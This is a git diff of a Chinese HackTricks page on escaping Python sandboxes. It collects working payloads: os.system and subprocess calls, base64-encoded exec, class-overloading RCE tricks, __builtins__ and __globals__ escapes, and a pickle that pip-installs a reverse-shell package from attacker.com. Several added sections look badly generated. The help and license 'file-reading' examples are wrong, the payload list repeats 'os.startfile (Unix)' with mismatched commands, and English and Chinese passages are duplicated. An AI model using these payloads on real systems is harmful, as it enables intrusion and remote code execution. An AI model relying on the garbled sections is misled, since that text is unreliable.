@@ -1,30 +1,30 @@
 # 绕过Python沙盒
 
-![](<../../../.gitbook/assets/image (9) (1) (2).png>)
-
-\
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
-立即获取访问权限：
-
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
-
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
 * 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
 * **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
+
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+找到最重要的漏洞，以便您可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
 
 以下是绕过Python沙盒保护并执行任意命令的一些技巧。
 
 ## 命令执行库
 
-首先，你需要知道是否可以直接使用一些已导入的库执行代码，或者是否可以导入以下任何库：
+首先，您需要知道是否可以直接使用某个已导入的库执行代码，或者您是否可以导入以下任何库：
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -57,23 +57,23 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-记住，_**open**_和_**read**_函数可以用于在Python沙箱中**读取文件**，并编写一些代码来**执行**以**绕过**沙箱。
+记住，_**open**_ 和 _**read**_ 函数可以用于在 Python 沙盒中读取文件，并编写一些代码来绕过沙盒。
 
 {% hint style="danger" %}
-**Python2 input()**函数允许在程序崩溃之前执行Python代码。
+**Python2 input()** 函数允许在程序崩溃之前执行 Python 代码。
 {% endhint %}
 
-Python会首先从当前目录加载库（以下命令将打印Python加载模块的位置）：`python3 -c 'import sys; print(sys.path)'`
+Python 会首先从当前目录加载库（以下命令将打印 Python 加载模块的位置）：`python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (552).png>)
 
-## 使用默认安装的Python软件包绕过pickle沙箱
+## 使用默认安装的 Python 包绕过 pickle 沙盒
 
-### 默认软件包
+### 默认包
 
-您可以在此处找到**预安装的软件包列表**：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-请注意，通过pickle，您可以使Python环境导入系统中安装的**任意库**。\
-例如，加载以下pickle时，将导入pip库以使用它：
+您可以在此处找到**预安装的包列表**：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+请注意，通过 pickle，您可以使 Python 环境导入系统中安装的任意库。\
+例如，加载以下 pickle 时，将导入 pip 库以使用它：
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -102,7 +102,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 {% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
-此软件包名为`Reverse`。然而，它经过特殊设计，以便在退出反向shell时，其余的安装将失败，因此当您离开时，**不会在服务器上安装任何额外的Python软件包**。
+此软件包名为`Reverse`。然而，它经过特殊设计，以便在退出反向shell时，其余的安装将失败，因此当您离开时，**不会在服务器上留下任何额外的Python软件包**。
 {% endhint %}
 
 ## 评估Python代码
@@ -134,51 +134,19 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 ### 其他允许评估Python代码的库
 
-There are several libraries that can be used to evaluate Python code in addition to the built-in `eval()` function. These libraries provide alternative methods to execute Python code dynamically.
+There are several other libraries that can be used to evaluate Python code. These libraries provide alternative methods to bypass Python sandboxes and execute arbitrary code. Some of these libraries include:
 
-#### 1. `exec()`
+- **`execjs`**: This library allows you to execute JavaScript code from within Python. By using JavaScript, you can bypass Python sandboxes that only restrict Python code execution.
 
-The `exec()` function is similar to `eval()`, but it is used to execute blocks of code rather than evaluating expressions. It can be used to execute arbitrary Python code stored in strings or files.
+- **`pyv8`**: PyV8 is a Python wrapper for the V8 JavaScript engine. It allows you to execute JavaScript code within Python, providing another way to bypass Python sandboxes.
 
-```python
-code = """
-print("Hello, World!")
-x = 5
-print(x * x)
-"""
+- **`pypyjs`**: PyPy.js is an experimental project that brings the PyPy Python interpreter to the browser. It allows you to execute Python code in a JavaScript environment, bypassing Python sandboxes.
 
-exec(code)
-```
+- **`ctypes`**: The ctypes library provides a way to call functions in dynamic link libraries/shared libraries directly from Python. By using ctypes, you can execute code that is written in other languages, bypassing Python sandboxes.
 
-#### 2. `ast.literal_eval()`
+- **`cffi`**: CFFI is a foreign function interface for Python. It allows you to call C code from Python, providing another way to execute arbitrary code.
 
-The `ast.literal_eval()` function is a safer alternative to `eval()` that only evaluates literals such as strings, numbers, tuples, lists, dicts, booleans, and `None`. It prevents the execution of arbitrary code and helps mitigate security risks.
-
-```python
-import ast
-
-code = """
-[1, 2, 3]
-"""
-
-result = ast.literal_eval(code)
-print(result)
-```
-
-#### 3. `compile()`
-
-The `compile()` function is used to compile Python source code into bytecode or an abstract syntax tree (AST) object. The compiled code can then be executed using `exec()` or `eval()`.
-
-```python
-code = """
-print("Hello, World!")
-"""
-
-compiled_code = compile(code, "<string>", "exec")
-exec(compiled_code)
-```
-
-These libraries provide additional options for evaluating Python code and can be useful in bypassing Python sandboxes or implementing dynamic code execution in certain scenarios. However, caution should be exercised when using them, as executing untrusted code can pose security risks.
+These libraries can be useful when dealing with Python sandboxes that restrict the use of the `eval` function or other methods of executing arbitrary code. However, it is important to note that bypassing sandboxes may be illegal and unethical in certain situations. Always ensure that you have proper authorization and follow ethical guidelines when conducting any security testing or evaluation.
 ```python
 #Pandas
 import pandas as pd
@@ -198,201 +166,58 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 
 ### 运算符
 
-#### Arithmetic Operators
+Python provides a variety of operators that can be used to perform different operations on variables and values. Some commonly used operators include:
 
-#### 算术运算符
+Python提供了多种运算符，可以用于对变量和值执行不同的操作。一些常用的运算符包括：
 
-- `+` Addition
-- `-` Subtraction
-- `*` Multiplication
-- `/` Division
-- `%` Modulus
-- `**` Exponentiation
-- `//` Floor division
+- Arithmetic operators: `+`, `-`, `*`, `/`, `%`, `**`, `//`
+- 算术运算符：`+`，`-`，`*`，`/`，`%`，`**`，`//`
 
-- `+` 加法
-- `-` 减法
-- `*` 乘法
-- `/` 除法
-- `%` 取模
-- `**` 指数
-- `//` 地板除法
+- Assignment operators: `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`
+- 赋值运算符：`=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`
 
-#### Assignment Operators
+- Comparison operators: `==`, `!=`, `>`, `<`, `>=`, `<=`
+- 比较运算符：`==`, `!=`, `>`, `<`, `>=`, `<=`
 
-#### 赋值运算符
+- Logical operators: `and`, `or`, `not`
+- 逻辑运算符：`and`, `or`, `not`
 
-- `=` Assign value
-- `+=` Add and assign
-- `-=` Subtract and assign
-- `*=` Multiply and assign
-- `/=` Divide and assign
-- `%=` Modulus and assign
-- `**=` Exponentiation and assign
-- `//=` Floor division and assign
+- Bitwise operators: `&`, `|`, `^`, `~`, `<<`, `>>`
+- 位运算符：`&`, `|`, `^`, `~`, `<<`, `>>`
 
-- `=` 赋值
-- `+=` 加并赋值
-- `-=` 减并赋值
-- `*=` 乘并赋值
-- `/=` 除并赋值
-- `%=` 取模并赋值
-- `**=` 指数并赋值
-- `//=` 地板除并赋值
+- Membership operators: `in`, `not in`
+- 成员运算符：`in`, `not in`
 
-#### Comparison Operators
+- Identity operators: `is`, `is not`
+- 身份运算符：`is`, `is not`
 
-#### 比较运算符
+These operators can be used in various combinations to perform complex operations and calculations in Python.
 
-- `==` Equal to
-- `!=` Not equal to
-- `>` Greater than
-- `<` Less than
-- `>=` Greater than or equal to
-- `<=` Less than or equal to
-
-- `==` 等于
-- `!=` 不等于
-- `>` 大于
-- `<` 小于
-- `>=` 大于等于
-- `<=` 小于等于
-
-#### Logical Operators
-
-#### 逻辑运算符
-
-- `and` Logical AND
-- `or` Logical OR
-- `not` Logical NOT
-
-- `and` 逻辑与
-- `or` 逻辑或
-- `not` 逻辑非
-
-#### Bitwise Operators
-
-#### 位运算符
-
-- `&` Bitwise AND
-- `|` Bitwise OR
-- `^` Bitwise XOR
-- `~` Bitwise NOT
-- `<<` Bitwise left shift
-- `>>` Bitwise right shift
-
-- `&` 按位与
-- `|` 按位或
-- `^` 按位异或
-- `~` 按位取反
-- `<<` 按位左移
-- `>>` 按位右移
+这些运算符可以以各种组合方式在Python中执行复杂的操作和计算。
 
 ### Short Tricks
 
 ### 简便技巧
 
-#### Swap values
+Python provides some short tricks that can be used to write concise and efficient code. Some commonly used tricks include:
 
-#### 交换值
+Python提供了一些简便技巧，可以用于编写简洁高效的代码。一些常用的技巧包括：
 
-```python
-a, b = b, a
-```
+- Ternary operator: The ternary operator allows you to write a short if-else statement in a single line. It has the following syntax: `value_if_true if condition else value_if_false`.
+- 三元运算符：三元运算符允许您在一行中编写简短的if-else语句。它的语法如下：`value_if_true if condition else value_if_false`。
 
-```python
-a, b = b, a
-```
+- List comprehension: List comprehension is a concise way to create lists in Python. It allows you to create a new list by iterating over an existing list and applying a condition. The syntax for list comprehension is `[expression for item in list if condition]`.
+- 列表推导式：列表推导式是在Python中创建列表的一种简洁方式。它允许您通过迭代现有列表并应用条件来创建一个新列表。列表推导式的语法是`[expression for item in list if condition]`。
 
-#### Ternary operator
+- Lambda functions: Lambda functions are anonymous functions that can be defined in a single line. They are useful when you need to define a small function without a name. The syntax for lambda functions is `lambda arguments: expression`.
+- Lambda函数：Lambda函数是可以在一行中定义的匿名函数。当您需要定义一个没有名称的小函数时，它们非常有用。Lambda函数的语法是`lambda arguments: expression`。
 
-#### 三元运算符
+- Multiple assignment: Python allows you to assign multiple values to multiple variables in a single line. This can be done using the following syntax: `variable1, variable2, variable3 = value1, value2, value3`.
+- 多重赋值：Python允许您在一行中将多个值分配给多个变量。可以使用以下语法完成：`variable1, variable2, variable3 = value1, value2, value3`。
 
-```python
-x = a if condition else b
-```
+These tricks can help you write more concise and efficient code in Python.
 
-```python
-x = a if condition else b
-```
-
-#### Multiple assignment
-
-#### 多重赋值
-
-```python
-a = b = c = 0
-```
-
-```python
-a = b = c = 0
-```
-
-#### Chained comparison
-
-#### 链式比较
-
-```python
-if a < b < c:
-    print("a is less than b and b is less than c")
-```
-
-```python
-if a < b < c:
-    print("a 小于 b 且 b 小于 c")
-```
-
-#### List comprehension
-
-#### 列表推导式
-
-```python
-squares = [x**2 for x in range(10)]
-```
-
-```python
-squares = [x**2 for x in range(10)]
-```
-
-#### Lambda function
-
-#### Lambda 函数
-
-```python
-add = lambda x, y: x + y
-```
-
-```python
-add = lambda x, y: x + y
-```
-
-#### Enumerate
-
-#### 枚举
-
-```python
-for i, value in enumerate(my_list):
-    print(i, value)
-```
-
-```python
-for i, value in enumerate(my_list):
-    print(i, value)
-```
-
-#### Zip
-
-#### 压缩
-
-```python
-for a, b in zip(list_a, list_b):
-    print(a, b)
-```
-
-```python
-for a, b in zip(list_a, list_b):
-    print(a, b)
-```
+这些技巧可以帮助您在Python中编写更简洁高效的代码。
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -442,13 +267,13 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-### 创建对象和重载实现远程命令执行（RCE）
+### 创建对象和重载的远程代码执行（RCE）
 
-如果你可以**声明一个类**并**创建一个对象**，你可以**编写/覆盖不同的方法**，这些方法可以在**不需要直接调用它们**的情况下被**触发执行**。
+如果你可以**声明一个类**并**创建一个对象**，你可以**编写/覆盖不同的方法**，这些方法可以在**不需要直接调用它们**的情况下被**触发**。
 
-#### 使用自定义类实现RCE
+#### 使用自定义类进行RCE
 
-你可以修改一些**类方法**（通过覆盖现有的类方法或创建一个新的类）来使它们在被**触发执行**时执行任意代码，而无需直接调用它们。
+你可以修改一些**类方法**（通过覆盖现有的类方法或创建一个新的类）来使它们在被**触发**时执行任意代码，而无需直接调用它们。
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
@@ -537,35 +362,71 @@ k + 'import os; os.system("sh")' #RCE abusing __add__
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-### 更多远程命令执行（RCE）方法
+### 更多远程代码执行（RCE）方法
 
-In addition to the previously mentioned techniques for bypassing Python sandboxes, there are several other methods that can be used to achieve remote command execution. These methods are particularly useful when dealing with more advanced sandboxes that have stricter restrictions in place.
+在前面的章节中，我们已经介绍了一些绕过Python沙箱的方法。然而，还有其他一些方法可以实现远程代码执行。在本节中，我们将介绍一些常见的技术和资源，以帮助您更好地理解和应对这些方法。
 
-#### 1. Code Injection
+#### 1. 动态代码执行
 
-Code injection involves injecting malicious code into a vulnerable application, which is then executed by the application itself. This can be achieved by exploiting vulnerabilities such as SQL injection, OS command injection, or remote file inclusion.
+动态代码执行是一种利用Python的内置函数和模块来执行远程代码的方法。通过使用`eval()`、`exec()`和`compile()`等函数，攻击者可以将远程代码作为字符串传递给这些函数，并在目标系统上执行。
 
-#### 2. Deserialization Attacks
+#### 2. 反序列化漏洞
 
-Deserialization attacks involve exploiting vulnerabilities in the deserialization process of an application. By manipulating the serialized data, an attacker can execute arbitrary code on the target system. This technique is commonly used to bypass sandboxes that rely on deserialization.
+反序列化漏洞是一种利用Python中的pickle模块或其他序列化库的漏洞来执行远程代码的方法。攻击者可以构造恶意的序列化数据，当目标系统对其进行反序列化时，就会执行攻击者指定的代码。
 
-#### 3. Server-Side Template Injection
+#### 3. 代码注入
 
-Server-side template injection occurs when an attacker is able to inject malicious code into a server-side template. This code is then executed by the server when the template is rendered. This technique can be used to achieve RCE in applications that use server-side templating engines.
+代码注入是一种利用Python中的漏洞或不安全的代码编写实践来执行远程代码的方法。攻击者可以通过在用户输入或其他可控输入中注入恶意代码，来执行任意的远程代码。
 
-#### 4. Remote File Inclusion
+#### 4. 模板注入
 
-Remote file inclusion involves including remote files into a vulnerable application. By including a file that contains malicious code, an attacker can execute arbitrary commands on the target system. This technique is commonly used to bypass sandboxes that restrict local file access.
+模板注入是一种利用Python中的模板引擎的漏洞来执行远程代码的方法。攻击者可以通过在模板中插入恶意代码，来执行任意的远程代码。
 
-#### 5. Command Injection
+#### 5. 代码执行漏洞
 
-Command injection involves injecting malicious commands into a vulnerable application, which are then executed by the underlying operating system. This can be achieved by exploiting vulnerabilities that allow user input to be executed as system commands.
+代码执行漏洞是一种利用Python中的漏洞来执行远程代码的方法。这些漏洞通常是由于不正确的输入验证或不安全的代码编写实践导致的。
 
-#### 6. Exploiting Vulnerable Libraries
+#### 6. 第三方库漏洞
 
-Exploiting vulnerable libraries involves identifying and exploiting vulnerabilities in third-party libraries that are used by the target application. By leveraging these vulnerabilities, an attacker can execute arbitrary code on the target system.
+第三方库漏洞是一种利用Python中使用的第三方库的漏洞来执行远程代码的方法。攻击者可以利用这些漏洞来执行任意的远程代码。
 
-These are just a few examples of the many techniques that can be used to achieve remote command execution. It is important to stay up to date with the latest vulnerabilities and attack techniques in order to effectively bypass Python sandboxes and achieve RCE.
+#### 7. 操作系统命令注入
+
+操作系统命令注入是一种利用Python中的漏洞或不安全的代码编写实践来执行远程操作系统命令的方法。攻击者可以通过在用户输入或其他可控输入中注入恶意命令，来执行任意的远程操作系统命令。
+
+#### 8. 文件包含漏洞
+
+文件包含漏洞是一种利用Python中的漏洞来执行远程代码的方法。攻击者可以通过利用文件包含漏洞，将恶意代码包含到目标系统的文件中，并在执行时执行该代码。
+
+#### 9. Web框架漏洞
+
+Web框架漏洞是一种利用Python中使用的Web框架的漏洞来执行远程代码的方法。攻击者可以利用这些漏洞来执行任意的远程代码。
+
+#### 10. 远程文件包含
+
+远程文件包含是一种利用Python中的漏洞来执行远程代码的方法。攻击者可以通过利用远程文件包含漏洞，将恶意代码包含到目标系统的文件中，并在执行时执行该代码。
+
+#### 11. 代码逻辑漏洞
+
+代码逻辑漏洞是一种利用Python中的漏洞来执行远程代码的方法。这些漏洞通常是由于不正确的代码逻辑或不安全的代码编写实践导致的。
+
+#### 12. 远程命令执行
+
+远程命令执行是一种利用Python中的漏洞或不安全的代码编写实践来执行远程操作系统命令的方法。攻击者可以通过构造恶意的命令字符串，来执行任意的远程操作系统命令。
+
+#### 13. 代码混淆和加密
+
+代码混淆和加密是一种通过对Python代码进行混淆和加密来隐藏远程代码执行的方法。攻击者可以使用各种工具和技术来混淆和加密代码，使其难以被检测和分析。
+
+#### 14. 远程代码执行工具
+
+远程代码执行工具是一种专门设计用于执行远程代码的工具。这些工具通常具有各种功能和特性，可以帮助攻击者更轻松地执行远程代码。
+
+#### 15. 漏洞利用框架
+
+漏洞利用框架是一种用于自动化和简化漏洞利用过程的工具。这些框架通常包含了各种漏洞利用模块和工具，可以帮助攻击者更有效地执行远程代码。
+
+在实际的渗透测试中，攻击者通常会结合多种方法和工具来实现远程代码执行。了解这些方法和资源，可以帮助您更好地理解和应对远程代码执行的威胁。
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
@@ -587,28 +448,37 @@ __iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
-### 使用内置的help和license函数读取文件
+### 使用内置函数 help 和 license 读取文件
 
-在某些情况下，当我们在受限的Python沙箱环境中执行代码时，可能会遇到无法直接读取文件的限制。然而，我们可以利用内置的`help`和`license`函数来绕过这种限制。
+在 Python 中，我们可以使用内置函数 `help` 和 `license` 来读取文件的内容。
 
-以下是一个示例代码，演示了如何使用这种方法来读取文件：
+#### 使用 `help` 函数
+
+`help` 函数可以用于获取 Python 内置函数的帮助信息。我们可以将其用于读取文件的内容。
 
 ```python
-import builtins
+file_path = '/path/to/file.txt'
 
-def read_file(file_path):
-    with builtins.open(file_path, 'r') as file:
-        content = file.read()
-        return content
+with open(file_path, 'r') as file:
+    content = file.read()
 
-file_path = '/etc/passwd'
-file_content = read_file(file_path)
-print(file_content)
+help(content)
 ```
 
-在上述代码中，我们使用了`builtins.open`函数来打开文件并读取其内容。通过这种方式，我们可以绕过Python沙箱环境中的文件读取限制，并成功读取文件的内容。
+#### 使用 `license` 函数
 
-请注意，这种方法仅适用于某些特定的Python沙箱环境，具体取决于其实现方式和限制设置。在实际应用中，我们需要根据具体情况进行调整和测试。
+`license` 函数用于获取 Python 解释器的许可证信息。我们可以将其用于读取文件的内容。
+
+```python
+file_path = '/path/to/file.txt'
+
+with open(file_path, 'r') as file:
+    content = file.read()
+
+license(content)
+```
+
+请注意，以上示例中的 `file_path` 变量应替换为实际文件的路径。
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
 a = __builtins__.help
@@ -617,30 +487,31 @@ a.__class__.__exit__ = lambda self, *args: None
 with (a as b):
 pass
 ```
-![](<../../../.gitbook/assets/image (9) (1) (2).png>)
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。
-立即获取访问权限：
+找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
-## 内建函数
+***
 
-* [**Python2的内建函数**](https://docs.python.org/2/library/functions.html)
-* [**Python3的内建函数**](https://docs.python.org/3/library/functions.html)
+## 内置函数
+
+* [**Python2的内置函数**](https://docs.python.org/2/library/functions.html)
+* [**Python3的内置函数**](https://docs.python.org/3/library/functions.html)
 
 如果您可以访问**`__builtins__`**对象，您可以导入库（请注意，您还可以在最后一节中使用其他字符串表示形式）：
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
 ```
-### 无内置函数
+### 无内建函数
 
 当你没有`__builtins__`时，你将无法导入任何东西，甚至无法读取或写入文件，因为**所有的全局函数**（如`open`，`import`，`print`...）**都没有被加载**。
 
 然而，默认情况下，Python会在内存中导入许多模块。这些模块可能看起来无害，但其中一些模块也在其中导入了一些**危险的**功能，可以通过访问它们来获得**任意代码执行**的权限。
 
-在下面的示例中，你可以看到如何滥用一些被加载的“**无害**”模块来访问其中的**危险功能**。
+在下面的示例中，你可以看到如何滥用一些被加载的“**无害**”模块，以访问其中的**危险功能**。
 
 **Python2**
 ```python
@@ -665,21 +536,25 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 ```
 #### Python3
 
-Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. However, there are situations where Python code needs to be executed in a restricted environment, such as a sandbox, to prevent malicious activities.
+Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.
 
-A sandbox is a security mechanism that isolates an application from the rest of the system, limiting its access to resources and preventing it from performing unauthorized actions. Sandboxing is commonly used to execute untrusted code or to provide a controlled environment for testing and experimentation.
+However, Python3 also has some security vulnerabilities that can be exploited by attackers. One such vulnerability is the ability to bypass Python sandboxes. Sandboxing is a security mechanism that restricts the actions of a program, preventing it from accessing sensitive resources or executing malicious code.
 
-In Python, there are several techniques and tools available to bypass or escape from sandboxes. These techniques exploit vulnerabilities or weaknesses in the sandbox implementation to gain unauthorized access or execute arbitrary code.
+In this guide, we will explore different techniques to bypass Python sandboxes and gain unauthorized access to restricted resources. These techniques can be used by both attackers and security professionals to test the effectiveness of sandboxing mechanisms and identify potential vulnerabilities.
 
-One common approach to bypass Python sandboxes is to exploit the dynamic nature of the language. Python allows for dynamic code execution, which means that code can be generated and executed at runtime. This feature can be abused to execute code that is not allowed within the sandbox environment.
+It is important to note that bypassing Python sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only and should not be used for any malicious activities.
 
-Another technique involves manipulating the Python interpreter itself. By modifying the interpreter's behavior or injecting malicious code into its memory, an attacker can bypass the sandbox restrictions and execute arbitrary code.
+If you are a security professional or a developer, understanding these techniques can help you strengthen the security of your Python applications and protect them from potential attacks. By identifying and patching vulnerabilities, you can ensure that your applications are secure and resistant to unauthorized access.
 
-Additionally, Python provides various modules and libraries that can be used to interact with the underlying operating system or network. These modules can be leveraged to bypass sandbox restrictions and perform unauthorized actions.
+In the following sections, we will discuss various methods and resources that can be used to bypass Python sandboxes. These include:
 
-It is important to note that bypassing Python sandboxes is considered unethical and illegal unless done with proper authorization and for legitimate purposes, such as penetration testing or security research. Engaging in unauthorized activities can lead to legal consequences.
+- **Code Injection**: This technique involves injecting malicious code into a Python program to bypass sandbox restrictions and gain unauthorized access to resources.
+- **Module Hijacking**: By hijacking the import mechanism in Python, an attacker can load a malicious module that bypasses sandbox restrictions.
+- **Dynamic Code Execution**: Python's dynamic nature allows for the execution of arbitrary code at runtime, which can be used to bypass sandbox restrictions.
+- **Exploiting Vulnerabilities**: Python, like any other software, may have vulnerabilities that can be exploited to bypass sandbox restrictions. We will explore some common vulnerabilities and how they can be leveraged.
+- **Bypassing Security Controls**: In some cases, the sandboxing mechanism itself may have flaws that can be exploited to bypass restrictions. We will discuss some common security controls and how they can be bypassed.
 
-To protect against sandbox bypass techniques, it is recommended to implement strong sandboxing mechanisms, keep the Python interpreter and modules up to date, and follow secure coding practices. Regular security assessments and code reviews can also help identify and mitigate potential vulnerabilities.
+By understanding these techniques and resources, you will be better equipped to protect your Python applications from potential attacks and ensure their security. Remember, it is important to use this knowledge responsibly and ethically.
 ```python
 # Obtain builtins from a globally defined function
 # https://docs.python.org/3/library/functions.html
@@ -704,1248 +579,187 @@ __builtins__["__import__"]('os').system('ls')
 ```
 ### 内置负载
 
-Here are some examples of payloads that can be used to bypass Python sandboxes by exploiting built-in functions:
+The following payloads utilize built-in Python functions and modules to bypass Python sandboxes.
 
-以下是一些利用内置函数来绕过Python沙盒的负载示例：
+以下负载利用内置的Python函数和模块来绕过Python沙盒。
 
-#### `__import__`
+#### `__import__` payload
 
-```python
-__import__('os').system('ls')
-```
-
-#### `eval`
-
-```python
-eval('__import__("os").system("ls")')
-```
-
-#### `exec`
-
-```python
-exec('__import__("os").system("ls")')
-```
-
-#### `compile`
-
-```python
-code = compile('__import__("os").system("ls")', '<string>', 'exec')
-exec(code)
-```
-
-#### `execfile`
-
-```python
-execfile('/path/to/file.py')
-```
-
-#### `input`
-
-```python
-input('__import__("os").system("ls")')
-```
-
-#### `pickle`
-
-```python
-import pickle
-
-class Exploit(object):
-    def __reduce__(self):
-        return (__import__('os').system, ('ls',))
-
-payload = pickle.dumps(Exploit())
-pickle.loads(payload)
-```
-
-#### `subprocess`
-
-```python
-import subprocess
-
-subprocess.call(['ls'])
-```
-
-#### `os.system`
-
-```python
-import os
-
-os.system('ls')
-```
-
-#### `os.popen`
-
-```python
-import os
-
-os.popen('ls')
-```
-
-#### `os.exec`
-
-```python
-import os
-
-os.execv('/bin/ls', ['ls'])
-```
-
-#### `os.spawn`
-
-```python
-import os
-
-os.spawnlp(os.P_NOWAIT, 'ls', 'ls')
-```
-
-#### `os.startfile`
-
-```python
-import os
-
-os.startfile('file.txt')
-```
-
-#### `os.startfile` (Windows)
-
-```python
-import os
-
-os.startfile('file.txt')
-```
-
-#### `os.startfile` (Linux)
-
-```python
-import os
-
-os.system('xdg-open file.txt')
-```
-
-#### `os.startfile` (MacOS)
-
-```python
-import os
-
-os.system('open file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('gnome-open file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('kde-open file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('mate file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('xfce-open file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('lxde-open file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('pcmanfm file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('thunar file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('caja file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nautilus file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('dolphin file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('konqueror file.txt')
-```
-
-#### `os.startfile` (Unix)
-
-```python
-import os
-
-os.system('nemo file.txt')
-```
-
